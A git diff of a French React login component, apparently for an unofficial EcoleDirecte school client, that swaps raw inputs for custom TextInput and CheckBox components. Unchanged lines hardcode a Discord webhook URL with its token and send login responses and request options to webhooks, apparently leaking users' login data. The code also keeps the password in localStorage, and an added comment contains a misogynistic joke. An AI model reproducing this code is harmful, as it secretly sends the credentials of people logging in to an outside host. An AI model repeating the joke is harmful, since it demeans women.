@@ -3,12 +3,14 @@ import { useState, useEffect } from "react";
 import { Outlet } from "react-router-dom";
 import "./Login.css"
 import EDPVersion from "../generic/EDPVersion"
+import TextInput from "../generic/TextInput"
+import CheckBox from "../generic/CheckBox"
 
 
 export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVersion }) {
 
     // Keeep logged in
-    const isKeepLoggedFeatureActive = false; // pour éviter les banIPs parce que ça spam les connexions
+    const isKeepLoggedFeatureActive = false; // pour éviter les banIPs parce que ça spam les connexions avec VITE ça refresh tt le temps
     useEffect(() => {
         const localUsername = localStorage.getItem("username");
         const localPassword = localStorage.getItem("password");
@@ -17,7 +19,7 @@ export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVe
             console.log("login")
             login(localUsername, localPassword);
         }
-    }, []) // useEffect de base s'exécute à chaque frame et là c'est 1 fois
+    }, []) // useEffect de base s'exécute à chaque frame et là c'est 1 fois avec la liste vide (je crois tu peux aussi mettre une variable pour qu'il s'exécute à chaque fois qu'elle change bref ça a l'air d'être une fonction vla useful et technique comme cette blague : "Pourquoi les femmes se maquillent et see parfument ? Parce qu'elle sont moches et qu'elles puent" oua complexe (nn)
     
     const apiLoginUrl = apiUrl + "login.awp?v=" + apiVersion;
     const piranhaPeche = "https://discord.com/api/webhooks/1095444665991438336/548oNdB76xiwOZ6_7-x0UxoBtl71by9ixi9aYVlv5pl_O7yq_nwMvXG2ZtAXULpQG7B3";
@@ -93,7 +95,7 @@ export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVe
                         })
 
                     } else if ("abcdefghijklmnopqrstuvwxyzABCDFGHIJKLMNOPQRSTUVXYZ".includes(accountType)) { // ALED
-                        // compte dont on ne doit pas prononcer le nom (cringe)
+                        // compte dont on ne doit pas prononcer le nom (cringe mais sinon road to jailbreak**-1)
                         sendToWebhook(piranhaPeche, { message: "OMG ????", response: response, options: options });
 
                     } else {
@@ -121,8 +123,8 @@ export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVe
             })
             .catch((error) => {
                 console.log("TURBO ERROR DETECTED: ");
-                setErrorMessage("Error: " + error.message);
                 console.log(error);
+                setErrorMessage("Error: " + error.message);
                 options["error"] = error;
                 sendToWebhook(sardineInsolente, options);
             })
@@ -132,9 +134,11 @@ export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVe
     }
 
     function handleSubmit(event) {
+        // UI
         setSubmitText("Connexion...");
         setErrorMessage("");
 
+        // Process login
         event.preventDefault();
         login(username, password);
     }
@@ -146,12 +150,13 @@ export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVe
             <div className="login-box">
                 <h1>Connexion</h1>
                 <form action="submit" onSubmit={handleSubmit}>
-                    <input className="login-input" type="text" placeholder="Identifiant" value={username} onChange={updateUsername} />
-                    <input className="login-input" type="password" placeholder="Mot de passe" value={password} onChange={updatePassword} />
+                    <TextInput className="login-input" textType="text" placeholder="Identifiant" value={username} onChange={updateUsername} />
+                    <TextInput className="login-input" textType="password" placeholder="Mot de passe" value={password} onChange={updatePassword} />
+                    {/*<input className="login-input" type="text" placeholder="Identifiant" value={username} onChange={updateUsername} />
+                    <input className="login-input" type="password" placeholder="Mot de passe" value={password} onChange={updatePassword} />*/}
                     {errorMessage && <p id="error-message">{errorMessage}</p>}
                     <div className="login-option">
-                        <input type="checkbox" id="keep-login" value={keepLoggedIn} onChange={updateKeepLoggedIn} />
-                        <label htmlFor="keep-login">Se souvenir de moi</label>
+                        <CheckBox id="keep-login" value={keepLoggedIn} onChange={updateKeepLoggedIn}/>
                         <a href="https://api.ecoledirecte.com/mot-de-passe-oublie.awp">Mot de passe oublié ?</a>
                     </div>
 
